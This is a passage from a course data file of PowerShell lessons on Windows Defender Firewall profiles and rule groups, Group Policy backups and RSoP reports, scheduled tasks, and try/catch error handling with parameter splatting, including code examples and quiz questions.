    slug: 'firewall-profiles-and-rules',
    title: 'Windows Defender Firewall: NLA Profiles, Rules & DisplayGroups',
    subtitle: 'Open management rules as a bundle with -DisplayGroup (or the language-neutral -Group), know what each bundle really opens, and fix profile mismatches',
    estimatedMinutes: 25,
    oneSentenceSummary:
      'Network Location Awareness (NLA) assigns every NIC to the `Domain`, `Private`, or `Public` firewall profile, and enabling rules by `-DisplayGroup` opens all required ports for a service cleanly without turning off the firewall.',
    summary:
      'When a junior admin cannot connect to a Windows Server remotely, their worst instinct is to disable the entire Windows Firewall (`Set-NetFirewallProfile -Enabled False`). A professional engineer never blinds the entire firewall, instead, they understand how **Network Location Awareness (NLA)** selects the active profile (`Domain`, `Private`, `Public`) and enable only the rule **group** they need (and know what that group opens). Lab setup: see the Lab Setup page.',
    whyItMatters:
      'On a headless Server Core machine, remote management snap-ins (Event Viewer, Disk Management, Service Manager, File Sharing) are blocked by default until you enable their specific Firewall DisplayGroups via PowerShell.',
    learningObjectives: [
      'Explain how Network Location Awareness (NLA) assigns the `Domain`, `Private`, or `Public` firewall profile to each network adapter',
      'Inspect and configure firewall profile defaults using `Get-NetFirewallProfile` and `Set-NetFirewallProfile`',
      'Query and enable built-in firewall rule bundles safely by `-DisplayGroup` (readable) or `-Group` (language-neutral) using `Get-NetFirewallRule` and `Enable-NetFirewallRule`, and say what a bundle opens',
      'Create custom inbound/outbound port rules using `New-NetFirewallRule`',
    ],
    keyTerms: [
      'Network Location Awareness (NLA)',
      'Domain, Private & Public Firewall Profiles',
      'Get-NetFirewallProfile & Set-NetFirewallProfile',
      'Get-NetFirewallRule & Enable-NetFirewallRule',
      '-DisplayGroup (Rule Grouping)',
      'New-NetFirewallRule',
    ],
    conceptSections: [
      {
        heading: 'The 3 Firewall Profiles & Network Location Awareness (NLA)',
        body: [
          'Windows Defender Firewall maintains three separate rulebooks called **Profiles**, and the **Network Location Awareness (NLA)** service automatically picks the right one for each network interface:\n1. **`Domain` Profile:** Assigned automatically when NLA can authenticate to your Active Directory Domain Controller on that network. Allows enterprise management rules.\n2. **`Private` Profile:** Assigned manually by an admin for a trusted home or isolated lab LAN (when no AD Domain Controller is present).\n3. **`Public` Profile (Default for Unknown Networks):** The strictest lockdown profile, designed for coffee-shop Wi-Fi or untrusted networks. Blocks network discovery and inbound file sharing.',
          'How do you check which profile is currently assigned to your network card? Run **`Get-NetConnectionProfile`**. If a lab server in a workgroup is stuck on `Public`, switch it to `Private` with:\n`Set-NetConnectionProfile -InterfaceIndex 4 -NetworkCategory Private`',
        ],
      },
      {
        heading: 'Enabling Rules by -DisplayGroup (Why You Never Turn Off the Whole Firewall)',
        body: [
          'Windows ships with hundreds of pre-built firewall rules grouped into logical bundles called **DisplayGroups** (for example, `"File and Printer Sharing"`, `"Windows Remote Management"`, `"Remote Event Log Management"`, `"Remote Service Management"`). Enabling a group is much safer than switching the firewall off, but it is **not** "just the exact port". A group is a defined set of rules: for example `File and Printer Sharing` opens SMB (445), NetBIOS, LLMNR and ICMP echo (ping), all in one go. Read what a group contains before you enable it.',
          'Instead of memorizing six different RPC and SMB port numbers, enable the built-in group, and look inside first:\n1. Discover the group names: `Get-NetFirewallRule | Select-Object -ExpandProperty DisplayGroup -Unique | Sort-Object`\n2. Look at what a group opens: `Get-NetFirewallRule -DisplayGroup "Remote Event Log Management" | Get-NetFirewallPortFilter`\n3. Enable all rules in that group (preview with `-WhatIf`):\n   `Enable-NetFirewallRule -DisplayGroup "Remote Event Log Management" -WhatIf`',
          '**Group names are translated.** `DisplayGroup` is localised, so `"File and Printer Sharing"` does not exist on a German or French Windows. The language-neutral name is the **`-Group`** value, which you can see with `Get-NetFirewallRule | Select-Object DisplayGroup, Group -Unique`. Verified examples: `Windows Remote Management` is `@FirewallAPI.dll,-30267`, `Remote Event Log Management` is `@FirewallAPI.dll,-29252`, `File and Printer Sharing` is `@FirewallAPI.dll,-28502`. Use them like this:\n`Enable-NetFirewallRule -Group "@FirewallAPI.dll,-30267"`',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'gotcha',
        title: 'When You Get Stuck: The Rule Is Enabled but the Port Is Still Closed',
        body: '1. **Profile mismatch.** A rule only works on the profiles it names. Compare `Get-NetConnectionProfile` (what profile is the NIC on?) with `Get-NetFirewallRule -DisplayGroup "Windows Remote Management" | Select-Object DisplayName, Enabled, Profile`. A rule for `Domain,Private` does nothing on a NIC that NLA put on `Public`. Fix the profile (`Set-NetConnectionProfile`) rather than widening the rule.\n2. **Several rules in a group.** Some are disabled by default, and some only allow the local subnet. Check `Enabled` and `RemoteAddress` per rule.\n3. **Block rules win.** An explicit Block beats an Allow. Run `Get-NetFirewallRule -Action Block -Enabled True`.\n4. **Group Policy overrides local rules.** Check the policy store: `Get-NetFirewallRule -PolicyStore ActiveStore`.\n5. **Test, do not guess.** From the client: `Test-NetConnection 192.168.56.20 -Port 5985`.',
      },
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Never disable the firewall with `Set-NetFirewallProfile -Enabled False` in production. Enable a rule bundle with `Enable-NetFirewallRule -DisplayGroup "..."` (check what it opens first), or create one narrow rule with `New-NetFirewallRule`.',
      },
      {
        type: 'try',
        title: 'Check Your Current Network Category and Firewall Profiles',
        body: 'Run `Get-NetConnectionProfile` and `Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction` to see your active firewall posture.',
      },
      {
        type: 'pro',
        title: 'Testing Remote TCP Ports with Test-NetConnection',
        body: 'Before blaming a service, test whether the remote firewall port is open using `Test-NetConnection -ComputerName 192.168.56.20 -Port 5985`. It shows `TcpTestSucceeded : True` only if the TCP handshake completed (it also tries ping, but a blocked ping alone does not mean the port is closed).',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Enable-NetFirewallRule',
        aliases: [],
        syntax: 'Enable-NetFirewallRule [-DisplayGroup <String[]>] [-DisplayName <String[]>] [-Name <String[]>]',
        parameters: [
          {
            name: '-DisplayGroup',
            type: 'String[]',
            description: 'Enables all firewall rules belonging to the specified group (e.g., "Windows Remote Management"). A group is a bundle of several rules, not one port. Names are localised; use -Group for the language-neutral name.',
          },
          {
            name: '-Group',
            type: 'String[]',
            description: 'Same idea as -DisplayGroup but uses the language-neutral group key, e.g. "@FirewallAPI.dll,-30267" for Windows Remote Management.',
          },
        ],
        examples: [
          'Enable-NetFirewallRule -DisplayGroup "Windows Remote Management" -WhatIf',
          'Enable-NetFirewallRule -Group "@FirewallAPI.dll,-30267"',
        ],
      },
      {
        cmdlet: 'New-NetFirewallRule',
        aliases: [],
        syntax: 'New-NetFirewallRule -DisplayName <String> -Direction <Direction> -Protocol <String> -LocalPort <String[]> -Action <Action>',
        parameters: [
          {
            name: '-Direction',
            type: 'Direction',
            description: 'Specifies Inbound or Outbound traffic.',
          },
          {
            name: '-LocalPort',
            type: 'String[]',
            description: 'Specifies the TCP or UDP port number(s) (e.g., 443, 8080).',
          },
          {
            name: '-Action',
            type: 'Action',
            description: 'Specifies Allow or Block.',
          },
        ],
        examples: [
          'New-NetFirewallRule -DisplayName "Allow Internal HTTPS App" -Direction Inbound -Protocol TCP -LocalPort 8443 -Action Allow -Profile Domain,Private',
        ],
      },
    ],
    codeExamples: [
      {
        title: 'Inspecting Firewall Profiles, Enabling DisplayGroups, and Creating Custom Port Rules',
        description: 'Lab only. Audit the 3 firewall profiles, enable remote management groups on Server Core (SRV-CORE01), and open a custom TCP port. Preview with -WhatIf first.',
        code: `# 1. Inspect the 3 Windows Defender Firewall profiles (Domain, Private, Public)
Get-NetFirewallProfile |
  Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction

# 2. Check which network profile NLA assigned to each active NIC
Get-NetConnectionProfile |
  Select-Object InterfaceAlias, NetworkCategory, IPv4Connectivity

# 3. See what a group really contains, then enable it
#    (-Group is the language-neutral name; DisplayGroup works on English systems)
Get-NetFirewallRule -DisplayGroup 'Windows Remote Management' |
  Select-Object DisplayName, Enabled, Profile, Direction
Enable-NetFirewallRule -Group '@FirewallAPI.dll,-30267' -WhatIf     # Windows Remote Management
Enable-NetFirewallRule -Group '@FirewallAPI.dll,-29252' -WhatIf     # Remote Event Log Management
# Remove -WhatIf to apply. Undo with Disable-NetFirewallRule -Group '<same value>'

# 4. Create a custom Inbound TCP rule for an internal web service on port 8443
New-NetFirewallRule -DisplayName 'Allow Internal Portal 8443' \`
  -Direction Inbound \`
  -Protocol TCP \`
  -LocalPort 8443 \`
  -Profile Domain, Private \`
  -Action Allow \`
  -WhatIf
# Undo later: Remove-NetFirewallRule -DisplayName 'Allow Internal Portal 8443'`,
        output: `Name    Enabled DefaultInboundAction DefaultOutboundAction
----    ------- -------------------- ---------------------
Domain     True        NotConfigured         NotConfigured
Private    True        NotConfigured         NotConfigured
Public     True        NotConfigured         NotConfigured

InterfaceAlias NetworkCategory IPv4Connectivity
-------------- --------------- ----------------
Ethernet0      DomainAuthenticated     Internet`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Creating a custom firewall rule while leaving `-Profile Any` on a laptop that connects to public airport Wi-Fi.',
        cause: 'By default, `New-NetFirewallRule` applies to all profiles (`Domain`, `Private`, and `Public`) unless you restrict `-Profile`.',
        fix: 'Always specify `-Profile Domain` (or `-Profile Domain, Private`) so internal service ports stay closed when on `Public` networks.',
      },
    ],
    tryItYourself: [
      'Run `Get-NetFirewallRule -Enabled True -Direction Inbound | Select-Object -First 10 DisplayName, DisplayGroup, Profile` to see which inbound ports are currently open on your machine.',
      'Run `Test-NetConnection -ComputerName microsoft.com -Port 443` to test a live TCP handshake.',
    ],
    knowledgeCheck: [
      {
        question: 'Which Windows service automatically detects whether a network interface is connected to an Active Directory domain and switches the firewall to the Domain profile?',
        options: [
          'Print Spooler',
          'Network Location Awareness (NLA)',
          'Task Scheduler',
          'Windows Installer',
        ],
        correctIndex: 1,
        explanation: 'Network Location Awareness (NLA) identifies the network and applies the Domain, Private, or Public firewall profile automatically.',
      },
      {
        question: 'What is the safest and cleanest way to allow "File and Printer Sharing" through Windows Defender Firewall via PowerShell?',
        options: [
          'Set-NetFirewallProfile -All -Enabled False',
          'Enable-NetFirewallRule -DisplayGroup "File and Printer Sharing"',
          'Stop-Service mpsdrv',
          'Delete system32\\firewall.cpl',
        ],
        correctIndex: 1,
        explanation: 'Enabling the built-in group opens only that bundle of rules for the profiles it names, while the firewall stays on. A group can still contain several rules (File and Printer Sharing includes SMB, NetBIOS, LLMNR and ping), so check what it opens first.',
      },
    ],
  },

  {
    id: '13-2',
    chapterId: 'chapter-13',
    slug: 'gpo-rsop-and-scheduled-tasks',
    title: 'Group Policy Administration (GPO & RSoP) and Windows Scheduled Tasks',
    subtitle: 'Trigger remote policy refreshes (with the firewall prerequisites), audit effective GPO settings in HTML, and schedule automated scripts safely',
    estimatedMinutes: 30,
    oneSentenceSummary:
      'The `GroupPolicy` module lets you create, back up, link, and audit Group Policy Objects (`Get-GPO`, `Backup-Gpo`, `Invoke-GPUpdate`, `Get-GPResultantSetOfPolicy`), while `ScheduledTasks` automates recurring background scripts.',
    summary:
      'In an Active Directory domain, **Group Policy Objects (GPOs)** push security baselines, registry settings, and login scripts to thousands of machines automatically. In this lesson, we remember the GPO inheritance order (**LSDOU**: Local → Site → Domain → OU), manage and back up GPOs with PowerShell, generate HTML **Resultant Set of Policy (RSoP)** reports to troubleshoot why a setting won or lost, and schedule recurring `.ps1` maintenance scripts with `Register-ScheduledTask`.',
    whyItMatters:
      'Before making any change to a production Group Policy Object, a senior admin always runs `Backup-Gpo -All` so they can roll back in 5 seconds, and uses `Get-GPResultantSetOfPolicy` to prove which GPO applied to a target server.',
    learningObjectives: [
      'State the GPO evaluation order (**L → S → D → OU**: Local, Site, Domain, Organizational Unit, where the last applied policy wins)',
      'Create, link, back up, and remotely refresh GPOs using `New-GPO`, `New-GPLink`, `Backup-Gpo`, and `Invoke-GPUpdate`',
      'Generate an HTML Resultant Set of Policy (RSoP) report using `Get-GPResultantSetOfPolicy -ReportType Html`',
      'Build and register automated Windows Scheduled Tasks using `New-ScheduledTaskAction`, `New-ScheduledTaskTrigger`, and `Register-ScheduledTask`',
    ],
    keyTerms: [
      'Group Policy Object (GPO)',
      'LSDOU Inheritance Order (Local → Site → Domain → OU)',
      'Get-GPO, New-GPO, New-GPLink & Backup-Gpo',
      'Invoke-GPUpdate (Remote Policy Refresh)',
      'Resultant Set of Policy (RSoP / Get-GPResultantSetOfPolicy)',
      'Register-ScheduledTask (Action + Trigger)',
    ],
    conceptSections: [
      {
        heading: 'GPO Inheritance (LSDOU), Backups, and Remote Policy Refreshes',
        body: [
          'When a domain computer boots or a user logs in, Windows applies Group Policies in strict **LSDOU** order:\n1. **L**ocal Group Policy (on the machine itself)\n2. **S**ite-level GPOs\n3. **D**omain-level GPOs (like the Default Domain Policy)\n4. **O**rganizational **U**nit (OU) GPOs (from parent OU down to child OU)\nBecause policies apply in that sequence, **the last policy applied (the closest child OU) overwrites earlier ones** - unless a higher GPO is marked **Enforced**!',
          'Key `GroupPolicy` cmdlets I use every week (lab domain `corp.example.com`; Lab setup: see the Lab Setup page):\n• List all GPOs in the domain: **`Get-GPO -All`**\n• Create and link a new GPO to an OU:\n  `New-GPO -Name "SEC-Server-Hardening" | New-GPLink -Target "OU=Servers,DC=corp,DC=example,DC=com"`\n• Back up every GPO in the domain before making edits:\n  `Backup-Gpo -All -Path "C:\\GPOBackups"`\n• Force a remote computer to refresh its policies now:\n  `Invoke-GPUpdate -Computer "SRV-CORE01.corp.example.com" -Force -RandomDelayInMinutes 0`',
          '**Why `-RandomDelayInMinutes 0`?** By default `Invoke-GPUpdate` waits a random delay of up to 10 minutes before it runs, to avoid every machine hitting the DC at once. So without it the refresh is *not* immediate. Also, a remote refresh works by creating a scheduled task on the target, so the target\'s firewall must allow **Remote Scheduled Tasks Management** and **Windows Management Instrumentation (WMI)** inbound (13-1 did not enable these). In the lab, on SRV-CORE01: `Enable-NetFirewallRule -Group "@FirewallAPI.dll,-33252"` and `Enable-NetFirewallRule -Group "@FirewallAPI.dll,-34251"` (preview with `-WhatIf`).',
        ],
      },
      {
        heading: 'Troubleshooting GPOs with Resultant Set of Policy (RSoP)',
        body: [
          'When 15 different GPOs are linked across a domain and an OU, how do you figure out *which* GPO actually won a conflict on `SRV-CORE01`? You calculate the **Resultant Set of Policy (RSoP)** and export it as a self-contained HTML report:\n`Get-GPResultantSetOfPolicy -Computer "SRV-CORE01" -ReportType Html -Path "C:\\Reports\\SRV-CORE01-RSoP.html"`\nOpen that HTML file in any browser and it shows every winning policy setting and the exact GPO name that delivered it. On the machine itself, the classic one-liner is **`gpresult /h C:\\Reports\\gp.html /f`** (add `/scope computer` for machine settings, and run it from an elevated prompt to see computer policy).',
        ],
      },
      {
        heading: 'Automating Recurring Scripts with Windows Scheduled Tasks',
        body: [
          'A script is only truly automated when you don’t have to remember to run it yourself. In PowerShell, registering a **Windows Scheduled Task** is like assembling four Lego pieces:\n1. **The Action (`New-ScheduledTaskAction`):** *What* program and arguments to launch (`powershell.exe -NoProfile -ExecutionPolicy RemoteSigned -File "C:\\Scripts\\NightlyBackup.ps1"`). Use `RemoteSigned`, or `AllSigned` with a signed script. Do not use `Bypass`: it switches off the checks that tell you a script was tampered with, and the same flag is something defenders hunt for (Chapter 16).\n2. **The Trigger (`New-ScheduledTaskTrigger`):** *When* to run it (`-Daily -At 2:00AM` or `-AtStartup`).\n3. **The Principal (`New-ScheduledTaskPrincipal`):** *Who* it runs as. Pick the least-privileged account that works (for example `-UserId "SYSTEM" -RunLevel Highest` only if it really needs it, or better a dedicated service account or gMSA).\n4. **Register (`Register-ScheduledTask`):** Combines Action, Trigger, Principal and the Task Name into the Windows Task Scheduler.\n**Lock down the script location.** A task that runs as SYSTEM from a folder that normal users can write to is a privilege-escalation hole: anyone could edit the script and get SYSTEM. Store scripts in a folder where only Administrators (and the task account) can write, for example `C:\\Scripts` with `icacls C:\\Scripts /inheritance:r /grant:r "Administrators:(OI)(CI)F" "SYSTEM:(OI)(CI)RX"`.',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'gotcha',
        title: 'When You Get Stuck: Did the GPO Actually Apply? Start with gpresult /h',
        body: '1. On the target (elevated): `gpresult /h C:\\Reports\\gp.html /f`, open it, and check **Applied GPOs** and **Denied GPOs** (the denied list says why: Security Filtering, WMI filter, or disabled link).\n2. `gpupdate /force` on the target itself rules out remote problems. If it works locally but `Invoke-GPUpdate` fails, it is the firewall prerequisite above.\n3. Is the computer in the OU you linked to (`Get-ADComputer SRV-CORE01 | Select-Object DistinguishedName`)? Computer settings do not follow users and vice versa.\n4. Is DNS right? A machine that cannot find DC01 gets no new policy (see the DNS-first notes in Chapter 12).\n5. Check link order, **Enforced** and **Block Inheritance** in `Get-GPInheritance -Target "OU=Servers,DC=corp,DC=example,DC=com"`.',
      },
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'GPOs evaluate in **LSDOU** order (where the closest OU wins), `Get-GPResultantSetOfPolicy` generates an HTML report proving which GPO won, and `Register-ScheduledTask` combines an Action + Trigger to run scripts on a schedule.',
      },
      {
        type: 'pro',
        title: 'Always Back Up GPOs Before Editing',
        body: 'Running `Backup-Gpo -All -Path C:\\GPOBackups` takes 3 seconds and lets you restore any accidentally broken GPO instantly with `Restore-GPO -Name "..." -Path C:\\GPOBackups`.',
      },
      {
        type: 'gotcha',
        title: 'Running a .ps1 Script in New-ScheduledTaskAction',
        body: 'Task Scheduler runs `.exe` binaries, not `.ps1` files directly! Always set `-Execute "powershell.exe"` and pass your script in `-Argument "-NoProfile -ExecutionPolicy RemoteSigned -File C:\\Scripts\\YourScript.ps1"`. Avoid `-ExecutionPolicy Bypass`: it removes the safety check, and defenders treat that flag as a warning sign.',
      },
      {
        type: 'danger',
        title: 'A SYSTEM Task Is Only as Safe as the Script Folder',
        body: 'If a task runs as SYSTEM and its `.ps1` lives in a folder that ordinary users can edit, any user can change the script and run code as SYSTEM. Put task scripts in an admin-only folder, restrict the ACL, prefer a least-privileged task account or gMSA, and sign the script if you use `AllSigned`.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Get-GPResultantSetOfPolicy',
        aliases: [],
        syntax: 'Get-GPResultantSetOfPolicy [-Computer <String>] [-User <String>] -ReportType <ReportType> -Path <String>',
        parameters: [
          {
            name: '-ReportType',
            type: 'ReportType',
            description: 'Specifies Html or Xml format for the output RSoP report.',
          },
          {
            name: '-Path',
            type: 'String',
            description: 'The file path where the HTML or XML report will be saved.',
          },
        ],
        examples: [
          'Get-GPResultantSetOfPolicy -ReportType Html -Path C:\\Reports\\RSoP.html',
        ],
      },
      {
        cmdlet: 'Register-ScheduledTask',
        aliases: [],
        syntax: 'Register-ScheduledTask [-TaskName] <String> -Action <CimInstance> -Trigger <CimInstance[]> [-Principal <CimInstance>] [-User <String>]',
        parameters: [
          {
            name: '-Action',
            type: 'CimInstance',
            description: 'The task action created with New-ScheduledTaskAction.',
          },
          {
            name: '-Trigger',
            type: 'CimInstance[]',
            description: 'The schedule trigger created with New-ScheduledTaskTrigger.',
          },
          {
            name: '-Principal',
            type: 'CimInstance',
            description: 'Who the task runs as and with which privileges, created with New-ScheduledTaskPrincipal. Use it instead of -User when you need a run level or a service account.',
          },
        ],
        examples: [
          'Register-ScheduledTask -TaskName "NightlyAudit" -Action $action -Trigger $trigger -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest)',
        ],
      },
    ],
    codeExamples: [
      {
        title: 'Backing Up GPOs, Generating HTML RSoP Reports, and Registering a Scheduled Task',
        description: 'Lab only (run on DC01 with RSAT GroupPolicy). Manage Group Policy backups and RSoP reports, then schedule a nightly PowerShell script at 02:00 AM with a task principal and a RemoteSigned policy.',
        code: `# 1. List all GPOs and back them up to a timestamped folder
Get-GPO -All | Select-Object DisplayName, GpoStatus, ModificationTime
$backupDir = "C:\\Backups\\GPOs\\$(Get-Date -Format 'yyyy-MM-dd_HH-mm')"
New-Item -ItemType Directory -Path $backupDir -Force | Out-Null
Backup-Gpo -All -Path $backupDir

# 2. Generate an HTML Resultant Set of Policy (RSoP) report for troubleshooting
Get-GPResultantSetOfPolicy -Computer 'SRV-CORE01' \`
  -ReportType Html \`
  -Path 'C:\\Backups\\SRV-CORE01-RSoP.html'

# 3. Create and register a Nightly PowerShell Scheduled Task (02:00 AM Daily)
#    Use RemoteSigned (or AllSigned with a signed script), never Bypass.
#    Keep C:\\Scripts writable only by Administrators, because SYSTEM will run what is in it.
$action    = New-ScheduledTaskAction -Execute 'powershell.exe' \`
               -Argument '-NoProfile -ExecutionPolicy RemoteSigned -File "C:\\Scripts\\Audit-Server.ps1"'
$trigger   = New-ScheduledTaskTrigger -Daily -At '02:00AM'
$principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName 'PSAcademy-Nightly-Audit' \`
  -Action $action \`
  -Trigger $trigger \`
  -Principal $principal \`
  -Description 'Runs nightly server security audit script'

# Undo: Unregister-ScheduledTask -TaskName 'PSAcademy-Nightly-Audit' -Confirm:$false`,
        output: `DisplayName                  GpoStatus        ModificationTime
-----------                  ---------        ----------------
Default Domain Policy        AllSettingsEnabled 11/3/2026 9:00:00 AM
SEC-Server-Hardening         AllSettingsEnabled 11/3/2026 11:30:00 PM

TaskPath   TaskName                 State
--------   --------                 -----
\\          PSAcademy-Nightly-Audit  Ready`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Creating a GPO with `New-GPO -Name "MyPolicy"` and wondering why no computers receive its settings.',
        cause: '`New-GPO` creates the policy object in the domain’s Group Policy Objects container, but it is **unlinked** until you attach it to a Domain or OU with `New-GPLink`!',
        fix: 'Always link your new GPO to its target OU or Domain using `New-GPLink -Name "MyPolicy" -Target "OU=Servers,DC=corp,DC=example,DC=com"`.',
      },
      {
        mistake: 'Running `Invoke-GPUpdate -Computer SRV-CORE01 -Force` and expecting the policy to apply right now.',
        cause: 'The default random delay is up to 10 minutes, and the remote refresh also fails silently if the target firewall blocks Remote Scheduled Tasks Management or WMI.',
        fix: 'Add `-RandomDelayInMinutes 0`, enable those two firewall groups on the target, and confirm with `gpresult /h`.',
      },
    ],
    tryItYourself: [
      'Run `Get-ScheduledTask | Where-Object State -eq "Ready" | Select-Object -First 10 TaskName, TaskPath, State` on your machine to inspect active scheduled tasks.',
      'Build a `$trigger = New-ScheduledTaskTrigger -Daily -At 3am` object in memory and pipe `$trigger | Format-List *` to inspect its properties.',
    ],
    knowledgeCheck: [
      {
        question: 'In what order does Windows evaluate Group Policy Objects (where the last applied policy wins unless Enforced)?',
        options: [
          'OU → Domain → Site → Local',
          'LSDOU: Local → Site → Domain → Organizational Unit (OU)',
          'Alphabetical order by GPO name',
          'Random order',
        ],
        correctIndex: 1,
        explanation: 'Group Policy is processed in LSDOU order (Local, Site, Domain, Parent OU, Child OU), so the closest OU policy is applied last and wins conflicts.',
      },
      {
        question: 'Which cmdlet generates an HTML report showing the effective Resultant Set of Policy (RSoP) applied to a computer and user?',
        options: [
          'Get-GPResultantSetOfPolicy -ReportType Html -Path report.html',
          'Export-GpoHtml',
          'Invoke-GPUpdate',
          'Backup-Gpo',
        ],
        correctIndex: 0,
        explanation: 'Get-GPResultantSetOfPolicy calculates the effective policies and writes a detailed HTML or XML report to disk.',
      },
    ],
  },

  // ==========================================================================
  // CHAPTER 14: PROFESSIONAL TOOLMAKING: ADVANCED FUNCTIONS, SPLATTING & ERROR HANDLING
  // ==========================================================================
  {
    id: '14-1',
    chapterId: 'chapter-14',
    slug: 'error-handling-and-splatting',
    title: 'Bulletproof Error Handling (Try/Catch/Finally) & Parameter @Splatting',
    subtitle: 'Why Try/Catch silently misses errors by default, and how -ErrorAction Stop and @Splatting make scripts rock-solid',
    estimatedMinutes: 25,
    oneSentenceSummary:
      '`try / catch` only catches **terminating** errors, so you must add `-ErrorAction Stop` to force cmdlet failures into your `catch` block, and Parameter Splatting (`@params`) turns messy 10-parameter lines into clean hashtables.',
    summary:
      'Have you ever wrapped a failing command inside a `try { Get-Item C:\\MissingFile.txt } catch { ... }` block and watched PowerShell print a giant red error message on the screen while **completely ignoring your `catch` block**? That single quirk trips up a lot of PowerShell scripters! In this lesson, you will learn the difference between Non-Terminating and Terminating errors, force errors into `catch` using `-ErrorAction Stop`, and clean up long commands with **Parameter Splatting (`@params`)**.',
    whyItMatters:
      'Production automation must handle offline servers, missing files, and permission errors gracefully, and nobody wants to debug a 350-character command line full of fragile backticks when `@Splatting` makes it clean.',
    learningObjectives: [
      'Distinguish between a **Non-Terminating Error** (default cmdlet warning that keeps the pipeline running) and a **Terminating Error** (halts execution and triggers `catch`)',
      'Add **`-ErrorAction Stop`** inside `try { ... }` so non-terminating errors trigger the `catch { ... }` block reliably',
      'Inspect the automatic **`$_`** (`$PSItem`) error record inside `catch` (`$_.Exception.Message`) and run cleanup code in `finally { ... }`',
      'Replace long multi-parameter command calls with clean **Parameter Splatting (`@hashtable` with `@`, not `$`!)**',
    ],
    keyTerms: [
      'Terminating vs. Non-Terminating Error',
      '-ErrorAction Stop (SilentlyContinue, Continue, Stop)',
      'try / catch / finally',
      '$_.Exception.Message & $Error[0]',
      'Parameter Splatting (@params vs $params)',
    ],
    conceptSections: [
      {
        heading: 'Why try / catch Ignores Cmdlet Errors Unless You Add -ErrorAction Stop!',
        body: [
          'Remember how PowerShell is designed to process 100 servers or 1,000 files in a single pipeline? Suppose Server #3 out of 100 is offline. If PowerShell crashed the entire script on Server #3, Servers #4 through #100 would never get processed!',
          'Therefore, PowerShell has **two kinds of errors**:\n1. **Non-Terminating Errors (Default):** The cmdlet writes a red error message to the Error Stream, **and keeps going to the next item**. Because it does not halt execution, **a Non-Terminating Error does NOT trigger a `catch` block!**\n2. **Terminating Errors:** A fatal error that halts that pipeline immediately **and jumps straight into your `catch { ... }` block**.',
          '**The Golden Rule of `try / catch`:** Whenever you put a cmdlet inside a `try { ... }` block, add **`-ErrorAction Stop`** to that cmdlet! `-ErrorAction Stop` tells PowerShell: *"Convert any non-terminating error on this command into a terminating error so my `catch` block catches it!"*',
        ],
      },
      {
        heading: 'Parameter Splatting (@params): Death to the Backtick!',
        body: [
          'Remember in Chapter 12 when `New-ADUser` had 8 different parameters stretched across 8 lines with backticks (`` ` ``)? There is a much cleaner, professional way called **Parameter Splatting**:\n1. Put all your parameter names (`Key`) and values (`Value`) inside a normal Hashtable (`$userParams = @{ Name = "Izaz"; Department = "Security"; Enabled = $true }`).\n2. Pass that hashtable to the cmdlet using the **`@` splat symbol instead of `$`**:\n   **`New-ADUser @userParams`**\nPowerShell automatically unpacks every key-value pair in `@userParams` as `-Key Value` parameters on the cmdlet! No backticks, easy to read, and you can even add or modify keys dynamically before calling the command.',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Always pair `try / catch` with `-ErrorAction Stop` so cmdlet failures actually enter `catch`, and use `@splatHashtable` (with `@`, not `$`) to pass clean parameter tables to cmdlets.',
      },
      {
        type: 'gotcha',
        title: 'Define with $, Splat with @!',
        body: 'When you **create** the hashtable, you use a dollar sign: `$params = @{ ... }`. When you **splat** it onto a cmdlet, you replace `$` with `@`: `New-NetFirewallRule @params`!',
      },
      {
        type: 'pro',
        title: 'Accessing the Exact Error Message Inside catch',
        body: 'Inside the `catch { ... }` block, `$_` represents the `ErrorRecord` object, and **`$_.Exception.Message`** gives you the clean, human-readable reason why the command failed.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Write-Warning',
        aliases: [],
        syntax: 'Write-Warning [-Message] <String>',
        parameters: [
          {
            name: '-Message',
            type: 'String',
            description: 'Writes a yellow warning message to the warning stream without halting execution.',
          },
        ],
        examples: ['Write-Warning "Server SRV-CORE01 did not respond; falling back to DR node."'],
      },
      {
        cmdlet: 'Get-Content (with -ErrorAction Stop)',
        aliases: ['gc', 'cat', 'type'],
        syntax: 'Get-Content [-Path] <String[]> [-ErrorAction <ActionPreference>]',
        parameters: [
          {
            name: '-ErrorAction',
            type: 'ActionPreference',
            description: 'Controls what happens on a non-terminating error. Continue (default) prints and moves on, SilentlyContinue hides it, Stop turns it into a terminating error that a catch block can handle.',
          },
        ],
        examples: ['try { Get-Content -Path C:\\NoSuchFile.txt -ErrorAction Stop } catch { $_.Exception.Message }'],
      },
    ],
    codeExamples: [
      {
        title: 'Bulletproof Try/Catch/Finally with -ErrorAction Stop and Parameter @Splatting',
        description: 'Catch a missing file error cleanly with -ErrorAction Stop and splat a hashtable onto New-NetFirewallRule.',
        code: `# 1. Try / Catch / Finally with -ErrorAction Stop
try {
  $config = Get-Content -Path 'C:\\NonExistent\\settings.json' -ErrorAction Stop
} catch {
  Write-Warning "Caught error cleanly: $($_.Exception.Message)"
} finally {
  Write-Output "Finally block always runs (cleanup / closing connections)."
}

# 2. Parameter Splatting (@ruleParams instead of messy backticks!)
$ruleParams = @{
  DisplayName = 'Allow HTTPS Web Traffic'
  Direction   = 'Inbound'
  Protocol    = 'TCP'
  LocalPort   = 443
  Profile     = @('Domain', 'Private')
  Action      = 'Allow'
  WhatIf      = $true
}

New-NetFirewallRule @ruleParams`,
        output: `WARNING: Caught error cleanly: Cannot find path 'C:\\NonExistent\\settings.json' because it does not exist.
Finally block always runs (cleanup / closing connections).
What if: Creating firewall rule 'Allow HTTPS Web Traffic'.`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Writing `try { Get-Service NonExistentService } catch { "Failed" }` without `-ErrorAction Stop`.',
